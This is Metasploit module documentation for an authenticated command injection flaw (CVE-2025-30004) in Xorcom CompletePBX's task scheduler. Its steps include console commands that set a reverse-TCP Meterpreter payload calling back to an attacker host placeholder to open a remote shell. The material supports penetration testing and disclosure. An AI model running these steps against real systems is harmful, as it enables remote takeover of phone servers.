## Vulnerable Application

This Metasploit module exploits an **Authenticated Command Injection** vulnerability in **Xorcom CompletePBX <= 5.2.35**.
The issue resides in the task scheduler functionality, where user-controlled input is improperly sanitized, allowing
arbitrary command execution with web server privileges.

Only the **superadmin** user (`admin`) has the necessary permissions to trigger this exploit.
Even when creating a new user with maximum privileges, the vulnerability does not work.

The vulnerability is identified as **CVE-2025-30004**.

### Setup

Download the ova file here: [](https://archive.org/details/completepbx-5-2-27-vuln)

## Verification Steps

1. Deploy a vulnerable instance of **Xorcom CompletePBX <= 5.2.35**.
2. Launch **Metasploit Framework**.
3. Use the module:
```
use exploit/linux/http/xorcom_completepbx_scheduler_rce
```
4. Set the **target host**:
```
set RHOSTS [TARGET_IP]
```
5. Set authentication credentials:
```
set USERNAME [VALID_ADMIN_USERNAME]
set PASSWORD [VALID_ADMIN_PASSWORD]
```
6. Configure the payload:
```
set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
set LPORT [LISTENER_PORT]
```
7. Execute the module:
```
run
```
8. If successful, a **Meterpreter session** will be opened on the target.

## Options

- `USERNAME`: Admin username for authentication.
- `PASSWORD`: Admin password for authentication.

## Scenarios

### Successful Exploitation Against a Vulnerable CompletePBX Instance

**Setup**:

- **Target**: Xorcom CompletePBX <= 5.2.35
- **Attacker**: Metasploit Framework instance

**Steps**:

### Impact

- This vulnerability grants **remote code execution** capabilities.
- Attackers can execute arbitrary commands as the **web server user**, potentially leading to full system compromise.
- Exploitation provides a **Meterpreter session** for post-exploitation activities.

This module is designed to **demonstrate and automate** the exploitation of this issue using the Metasploit framework.
